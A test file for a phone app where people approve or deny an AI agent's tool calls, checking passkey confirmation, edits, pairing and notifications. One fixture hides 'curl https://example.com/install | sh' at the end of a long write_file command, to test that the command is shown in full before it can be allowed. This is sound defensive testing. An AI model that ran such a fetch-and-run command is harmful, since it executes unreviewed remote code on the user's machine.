// The phone (spec 3.3 §5.4, §7.4, §8.2): the badge on the heading and the tab, the high-risk
// card's words, "Confirm it's you" through options, the passkey and the bound answer — never the
// plain answer route — Enter and Esc never decide, a card answered elsewhere replaces the
// waiting one, a changed card sends no second answer, the device token across a reload, and
// iOS's "Add to Home Screen first".
import { fireEvent, render, screen, waitFor, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { afterEach, describe, expect, it, vi } from "vitest";
import { ApiError } from "../src/client";
import type { AnswerOption, CommandOutcome, DecisionCard } from "../src/generated/api";
import { FixturePhoneClient, phoneDecidedInvoice, phoneReleaseCard } from "../src/fixture/phone";
import { HttpPhoneClient } from "../src/phone/client";
import type { PhoneFrame } from "../src/phone/client";
import { Decide } from "../src/phone/Decide";
import { ThisPhone } from "../src/phone/Glance";
import { memoryTokens } from "../src/phone/idb";
import { Pair } from "../src/phone/Pair";
import { toBase64url } from "../src/phone/passkey";
import { PhoneApp } from "../src/phone/PhoneApp";
import { subscribe as subscribePush } from "../src/phone/push";
import { phoneShell } from "../src/phone/shell";

afterEach(() => {
  vi.restoreAllMocks();
  vi.unstubAllGlobals();
});

function json(body: unknown, status = 200) {
  return new Response(JSON.stringify(body), { status, headers: { "content-type": "application/json" } });
}

function option(answer: AnswerOption["answer"], label: string, needsExpanded = false): AnswerOption {
  return { answer, label, needsExpanded, needsPresence: false };
}

/** A medium-risk email the phone answers by touch: Allow once, Edit, Deny. */
function everydayCard(): DecisionCard {
  const card = phoneReleaseCard();
  return {
    ...card,
    id: "apr_mail",
    heading: "Send the October invoice",
    risk: "medium",
    riskText: "Medium risk",
    call: { tool: "send_email", args: { to: "client@example.com" }, text: 'send_email(to: "client@example.com")', truncated: false },
    allowed: { openInHome: false, options: [option("allowOnce", "Allow once"), option("edit", "Edit"), option("deny", "Deny")] },
  };
}

describe("the phone", () => {
  it("shows the waiting count on the heading and the tab", async () => {
    render(<PhoneApp client={new FixturePhoneClient()} initial={{ screen: "decisions" }} />);
    const heading = await screen.findByRole("heading", { name: /Decisions/ });
    await waitFor(() => expect(within(heading).getByText("1")).toBeTruthy());
    const tab = screen.getByRole("button", { name: /Decisions/ });
    expect(within(tab).getByText("1")).toBeTruthy();
  });

  it("says what a high-risk card needs, and how a decided one was answered", async () => {
    render(<PhoneApp client={new FixturePhoneClient()} initial={{ screen: "decisions" }} />);
    expect(await screen.findByText("Can't be undone · needs your face or fingerprint")).toBeTruthy();
    expect(screen.getByText("You said yes in Telegram at 07:31 · done once")).toBeTruthy();
    expect(screen.queryByRole("textbox")).toBeNull();
    expect(screen.queryByText("Resume all")).toBeNull();
  });

  it("confirms it's you through options, the passkey and the bound answer, never the answer route", async () => {
    const card = phoneReleaseCard();
    const answered: DecisionCard = { ...phoneDecidedInvoice(), id: card.id, heading: card.heading };
    const calls: string[] = [];
    vi.stubGlobal(
      "fetch",
      vi.fn(async (url: string, init?: RequestInit) => {
        calls.push(`${init?.method ?? "GET"} ${url}`);
        if (url.endsWith("/confirm/options")) {
          return json({ challengeId: "c1", publicKey: { challenge: "AAAA", rpId: "localhost", allowCredentials: [{ type: "public-key", id: "AQID" }] } });
        }
        if (url.endsWith("/confirm")) return json({ type: "answered", card: answered } satisfies CommandOutcome);
        return json(card);
      }),
    );
    const get = vi.fn(async () => ({
      toJSON: () => ({ id: "AQID", rawId: "AQID", type: "public-key", response: {} }),
    }));
    vi.stubGlobal("navigator", { ...navigator, credentials: { get } });
    const client = await HttpPhoneClient.open(memoryTokens("adk_dev_token"));
    render(<Decide client={client} id={card.id} onBack={() => undefined} onSettled={() => undefined} />);
    await userEvent.click(await screen.findByRole("button", { name: /Confirm it's you and approve/ }));
    await screen.findByText(/You said yes/);
    expect(get).toHaveBeenCalledTimes(1);
    const writes = calls.filter((call) => call.startsWith("POST"));
    expect(writes).toEqual([
      `POST /api/surface/decisions/${card.id}/confirm/options`,
      `POST /api/surface/decisions/${card.id}/confirm`,
    ]);
    expect(calls.some((call) => call.includes("/answer"))).toBe(false);
  });

  it("offers Deny only and the home when the passkey check fails, and never approves without presence", async () => {
    const client = new FixturePhoneClient();
    const confirm = vi
      .spyOn(client, "confirm")
      .mockRejectedValue(new ApiError(403, "Your face or fingerprint was not checked.", "surface.phone.passkey_not_used"));
    const answer = vi.spyOn(client, "answer");
    render(<Decide client={client} id="apr_release" onBack={() => undefined} onSettled={() => undefined} />);
    await userEvent.click(await screen.findByRole("button", { name: /Confirm it's you and approve/ }));
    expect(await screen.findByText("Approve it in the home on your computer")).toBeTruthy();
    expect(screen.queryByRole("button", { name: /Confirm it's you and approve/ })).toBeNull();
    expect(screen.getAllByRole("button").map((button) => button.textContent?.trim())).toContain("Deny");
    expect(confirm).toHaveBeenCalledTimes(1);
    expect(answer).not.toHaveBeenCalled();
  });

  it("offers Deny only and the home on a phone without its passkey", async () => {
    const client = new FixturePhoneClient();
    vi.spyOn(client, "info").mockResolvedValue({ pushKey: "BExample", rpId: "localhost", passkey: false, push: true, canAddPasskey: false });
    render(<Decide client={client} id="apr_release" onBack={() => undefined} onSettled={() => undefined} />);
    expect(await screen.findByText("Approve it in the home on your computer")).toBeTruthy();
    expect(screen.queryByRole("button", { name: /Confirm it's you and approve/ })).toBeNull();
  });

  it("never decides on Enter or Esc", async () => {
    const client = new FixturePhoneClient();
    const answer = vi.spyOn(client, "answer");
    const confirm = vi.spyOn(client, "confirm");
    render(<Decide client={client} id="apr_release" onBack={() => undefined} onSettled={() => undefined} />);
    const button = await screen.findByRole("button", { name: /Confirm it's you and approve/ });
    button.focus();
    await userEvent.keyboard("{Enter}");
    await userEvent.keyboard("{Escape}");
    screen.getByRole("button", { name: "Deny" }).focus();
    await userEvent.keyboard("{Enter}");
    expect(answer).not.toHaveBeenCalled();
    expect(confirm).not.toHaveBeenCalled();
  });

  it("shows a card answered elsewhere from the feed in place of the waiting one", async () => {
    const client = new FixturePhoneClient();
    let release: (frame: PhoneFrame) => void = () => undefined;
    vi.spyOn(client, "watch").mockImplementation(async function* () {
      yield await new Promise<PhoneFrame>((resolve) => {
        release = resolve;
      });
    });
    render(<Decide client={client} id="apr_release" onBack={() => undefined} onSettled={() => undefined} />);
    await screen.findByRole("button", { name: /Confirm it's you and approve/ });
    client.cards = client.cards.map((card) =>
      card.id === "apr_release"
        ? { ...phoneDecidedInvoice(), id: card.id, heading: card.heading, decided: { ...phoneDecidedInvoice().decided!, text: "You said yes in Telegram at 07:45" } }
        : card,
    );
    release({ type: "decisions", cards: [] });
    expect(await screen.findByText(/You said yes in Telegram at 07:45/)).toBeTruthy();
    expect(screen.queryByRole("button", { name: /Confirm it's you and approve/ })).toBeNull();
  });

  it("sends no second answer when the decision changed", async () => {
    const client = new FixturePhoneClient();
    const changed = { ...phoneReleaseCard(), version: 2 };
    const confirm = vi.spyOn(client, "confirm").mockResolvedValue({ type: "changed", card: changed });
    render(<Decide client={client} id="apr_release" onBack={() => undefined} onSettled={() => undefined} />);
    await userEvent.click(await screen.findByRole("button", { name: /Confirm it's you and approve/ }));
    expect(await screen.findByText(/changed since you saw it/)).toBeTruthy();
    expect(confirm).toHaveBeenCalledTimes(1);
    await userEvent.click(screen.getByRole("button", { name: /Confirm it's you and approve/ }));
    expect(confirm).toHaveBeenLastCalledWith(expect.objectContaining({ version: 2 }), "allowOnce", true, undefined);
  });

  it("keeps its device token across a reload", async () => {
    vi.stubGlobal("fetch", vi.fn(async () => json({ device: {}, token: "adk_dev_kept" })));
    const tokens = memoryTokens();
    const first = await HttpPhoneClient.open(tokens);
    expect(first.paired()).toBe(false);
    await first.claim("K7Q4-9MXC");
    const reloaded = await HttpPhoneClient.open(tokens);
    expect(reloaded.paired()).toBe(true);
    await reloaded.signOut();
    expect((await HttpPhoneClient.open(tokens)).paired()).toBe(false);
  });

  it("asks to add the app to the Home Screen first in Safari on an iPhone", () => {
    vi.stubGlobal("navigator", { ...navigator, userAgent: "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) Safari/604.1" });
    render(<Pair client={new FixturePhoneClient(false)} code="K7Q4-9MXC" onDone={() => undefined} />);
    expect(screen.getByRole("heading", { name: "Add to Home Screen first" })).toBeTruthy();
    expect(screen.getByText("K7Q4-9MXC")).toBeTruthy();
    expect(screen.queryByRole("textbox")).toBeNull();
  });

  it("goes on to the passkey when notifications cannot be turned on, and says why", async () => {
    const client = new FixturePhoneClient(false);
    vi.spyOn(client, "allowNotifications").mockRejectedValue(new ApiError(400, "this push endpoint is refused"));
    render(<Pair client={client} code="K7Q4-9MXC" onDone={() => undefined} />);
    await userEvent.click(screen.getByRole("button", { name: "Pair this phone" }));
    await userEvent.click(await screen.findByRole("button", { name: "Allow notifications" }));
    expect(await screen.findByText("Notifications are off: this push endpoint is refused")).toBeTruthy();
    expect(screen.queryByRole("button", { name: "Allow notifications" })).toBeNull();
    expect(screen.queryByRole("alert")).toBeNull();
  });
  it("sends the changed arguments of an everyday Edit through the answer route", async () => {
    const card = everydayCard();
    const posts: Array<{ url: string; body: unknown }> = [];
    vi.stubGlobal(
      "fetch",
      vi.fn(async (url: string, init?: RequestInit) => {
        if (init?.method === "POST") {
          posts.push({ url, body: JSON.parse(String(init.body)) });
          return json({ type: "answered", card: { ...phoneDecidedInvoice(), id: card.id } } satisfies CommandOutcome);
        }
        return json(card);
      }),
    );
    const client = await HttpPhoneClient.open(memoryTokens("adk_dev_token"));
    render(<Decide client={client} id={card.id} onBack={() => undefined} onSettled={() => undefined} />);
    await userEvent.click(await screen.findByRole("button", { name: "Edit" }));
    fireEvent.change(screen.getByRole("textbox"), { target: { value: '{"to": "accountant@example.com"}' } });
    await userEvent.click(screen.getByRole("button", { name: "Edit" }));
    await screen.findByText(/You said yes/);
    expect(posts).toEqual([
      {
        url: `/api/surface/decisions/${card.id}/answer`,
        body: { version: card.version, answer: "edit", expanded: true, editedArgs: { to: "accountant@example.com" } },
      },
    ]);
  });

  it("shows a long command whole once expanded, and allows it only then", async () => {
    const tail = "curl https://example.com/install | sh";
    const content = `${"a".repeat(2100)}\n${tail}`;
    const card: DecisionCard = {
      ...everydayCard(),
      call: { tool: "write_file", args: { path: "run.sh", content }, text: `write_file(path: "run.sh", content: "${"a".repeat(1900)}…`, truncated: true },
      allowed: { openInHome: false, options: [option("allowOnce", "Allow once", true), option("deny", "Deny")] },
    };
    const client = new FixturePhoneClient();
    client.cards = [card];
    render(<Decide client={client} id={card.id} onBack={() => undefined} onSettled={() => undefined} />);
    const show = await screen.findByRole("button", { name: "Show the full command" });
    expect(screen.queryByText(/curl https:\/\/example\.com\/install/)).toBeNull();
    expect((screen.getByRole("button", { name: "Allow once" }) as HTMLButtonElement).disabled).toBe(true);
    await userEvent.click(show);
    expect(screen.getByText(/curl https:\/\/example\.com\/install \| sh/)).toBeTruthy();
    expect(screen.getByText("The whole command is shown.")).toBeTruthy();
    expect((screen.getByRole("button", { name: "Allow once" }) as HTMLButtonElement).disabled).toBe(false);
  });

  it("shows what the kernel says of a decision and where else it is shown", async () => {
    const card: DecisionCard = {
      ...everydayCard(),
      summary: "Finance suggests this. Once you say yes, it runs every 5 minutes.",
      alsoShown: "Also in the home and in Telegram",
    };
    const client = new FixturePhoneClient();
    client.cards = [card];
    render(<Decide client={client} id={card.id} onBack={() => undefined} onSettled={() => undefined} />);
    expect(await screen.findByText("Finance suggests this. Once you say yes, it runs every 5 minutes.")).toBeTruthy();
    expect(screen.getByText("Also in the home and in Telegram")).toBeTruthy();
  });

  it("takes over a call that asks for a secret, as the phone", async () => {
    const card: DecisionCard = {
      ...everydayCard(),
      id: "apr_code",
      heading: "Type the code your bank sent",
      call: {
        tool: "harness:take-over",
        args: { tool: "bank_sign_in", secret: "oneTimeCode", resource: "https://bank.example.com/login", takeOver: true },
        text: "harness:take-over(…)",
        truncated: false,
      },
      allowed: { openInHome: false, options: [option("deny", "Deny")] },
    };
    const posts: Array<{ url: string; body: unknown }> = [];
    vi.stubGlobal(
      "fetch",
      vi.fn(async (url: string, init?: RequestInit) => {
        if (init?.method === "POST") {
          posts.push({ url, body: JSON.parse(String(init.body)) });
          return json({ type: "answered", card: { ...phoneDecidedInvoice(), id: card.id } } satisfies CommandOutcome);
        }
        return json(card);
      }),
    );
    const client = await HttpPhoneClient.open(memoryTokens("adk_dev_token"));
    render(<Decide client={client} id={card.id} onBack={() => undefined} onSettled={() => undefined} />);
    expect(await screen.findByText(/asks for a one-time code/)).toBeTruthy();
    await userEvent.click(screen.getByRole("button", { name: "Take over" }));
    fireEvent.change(screen.getByPlaceholderText("Type it here"), { target: { value: "731905" } });
    await userEvent.click(screen.getByRole("button", { name: "Done" }));
    await screen.findByText(/You said yes/);
    expect(posts).toEqual([
      { url: `/api/surface/decisions/${card.id}/take-over`, body: { surface: "phone", version: card.version, secret: "731905" } },
    ]);
  });

  it("says a read failed rather than that nothing waits, and offers to pair again once the pairing ended", async () => {
    const client = new FixturePhoneClient();
    const ended = new ApiError(401, "Your phone's pairing ended: pair it again", "kernel.unauthorized");
    vi.spyOn(client, "decisions").mockRejectedValue(ended);
    vi.spyOn(client, "status").mockRejectedValue(ended);
    render(<PhoneApp client={client} initial={{ screen: "decisions" }} />);
    expect(await screen.findByText(/Decisions could not be read: Your phone's pairing ended/)).toBeTruthy();
    expect(screen.getByRole("button", { name: "Pair this phone again" })).toBeTruthy();
    expect(screen.queryByText("Nothing is waiting for you.")).toBeNull();
  });

  it("claims a pairing link's code on a phone that still holds an older token", async () => {
    const client = new FixturePhoneClient(true);
    const claim = vi.spyOn(client, "claim");
    render(<Pair client={client} code="K7Q4-9MXC" onDone={() => undefined} />);
    await userEvent.click(screen.getByRole("button", { name: "Pair this phone" }));
    expect(claim).toHaveBeenCalledWith("K7Q4-9MXC");
  });

  it("says when the browser or the phone's settings block notifications, while pairing and in Memory", async () => {
    const pairing = new FixturePhoneClient(false);
    vi.spyOn(pairing, "allowNotifications").mockResolvedValue(false);
    const { unmount } = render(<Pair client={pairing} code="K7Q4-9MXC" onDone={() => undefined} />);
    await userEvent.click(screen.getByRole("button", { name: "Pair this phone" }));
    await userEvent.click(await screen.findByRole("button", { name: "Allow notifications" }));
    expect(await screen.findByText(/Notifications are off: this browser or the phone's settings block them/)).toBeTruthy();
    unmount();

    const paired = new FixturePhoneClient();
    vi.spyOn(paired, "info").mockResolvedValue({ pushKey: "BExample", rpId: "localhost", passkey: true, push: false, canAddPasskey: false });
    vi.spyOn(paired, "allowNotifications").mockResolvedValue(false);
    render(<ThisPhone client={paired} onSignedOut={() => undefined} />);
    await userEvent.click(await screen.findByRole("button", { name: "Allow notifications" }));
    expect(await screen.findByText(/Notifications are off: this browser or the phone's settings block them/)).toBeTruthy();
  });

  it("ends the phone's wake-ups when it signs out", async () => {
    const calls: string[] = [];
    vi.stubGlobal(
      "fetch",
      vi.fn(async (url: string, init?: RequestInit) => {
        calls.push(`${init?.method ?? "GET"} ${url}`);
        return new Response(null, { status: 204 });
      }),
    );
    const tokens = memoryTokens("adk_dev_token");
    const client = await HttpPhoneClient.open(tokens);
    await client.signOut();
    expect(calls).toEqual(["DELETE /api/surface/phone/push"]);
    expect(await tokens.read()).toBeUndefined();
  });

  it("subscribes again when the kernel's push key changed", async () => {
    const unsubscribe = vi.fn(async () => true);
    const existing = {
      options: { applicationServerKey: new Uint8Array([4, 1, 1, 1]).buffer },
      unsubscribe,
      toJSON: () => ({ endpoint: "https://web.push.apple.com/old" }),
    };
    const subscribe = vi.fn(async (options: PushSubscriptionOptionsInit) => ({
      options,
      unsubscribe,
      toJSON: () => ({ endpoint: "https://web.push.apple.com/new" }),
    }));
    const registration = { pushManager: { getSubscription: async () => existing, subscribe } };
    vi.stubGlobal("Notification", { requestPermission: async () => "granted" });
    vi.stubGlobal("PushManager", function PushManager() {});
    vi.stubGlobal("navigator", { ...navigator, serviceWorker: { register: async () => registration, ready: Promise.resolve(registration) } });
    expect(await subscribePush(toBase64url(new Uint8Array([4, 1, 1, 1])))).toEqual({ endpoint: "https://web.push.apple.com/old" });
    expect(unsubscribe).not.toHaveBeenCalled();
    expect(await subscribePush(toBase64url(new Uint8Array([4, 2, 2, 2])))).toEqual({ endpoint: "https://web.push.apple.com/new" });
    expect(unsubscribe).toHaveBeenCalledTimes(1);
    expect(subscribe).toHaveBeenCalledTimes(1);
  });

  it("leaves the home installed on a computer to the home's shell", async () => {
    const media = (coarse: boolean) => (query: string) => ({
      matches: query === "(display-mode: standalone)" || (coarse && query === "(pointer: coarse)"),
    });
    vi.stubGlobal("matchMedia", media(false));
    expect(await phoneShell({ pathname: "/ui/decisions" })).toBeUndefined();
    vi.stubGlobal("matchMedia", media(true));
    expect(await phoneShell({ pathname: "/ui/decisions" })).toBeDefined();
  });
});
